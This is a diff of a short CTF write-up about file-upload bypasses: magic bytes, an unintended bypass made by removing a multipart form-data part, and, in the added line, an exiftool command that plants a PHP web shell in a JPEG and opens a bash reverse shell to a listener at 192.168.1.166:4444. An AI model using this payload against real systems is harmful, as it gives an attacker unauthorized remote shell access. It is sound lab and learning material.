@@ -1,7 +1,9 @@
 ### Weird File Upload Vector: MultiPart Boundary Parameter Removal (with PoC)
 
 So during my 2nd Semester, 1st year in Uni, I and other students were given a practical CTF assignment. During this, I spent 1-2 weeks testing for different stuff, even after I got the flags.
-One of the issues, which was taught in the lectures was a file upload attack using magic bytes to get shell.
+One of the issues, which was taught in the lectures was a file upload attack using magic bytes to get shell. 
+
+The other was using exiftool - ```exiftool -Comment='<?php system("bash -c '\''bash -i >& /dev/tcp/192.168.1.166/4444 0>&1'\''"); ?>' Canon_40D.jpg -o polyglot.php```
 
 Although, I did find another unintended bypass by completely removing the boundary parameter at the bottom, more specifically the ```Content-Disposition: form-data; name="submit"```.
 Removing other boundary parameters weren't successful, only this one for some reason.
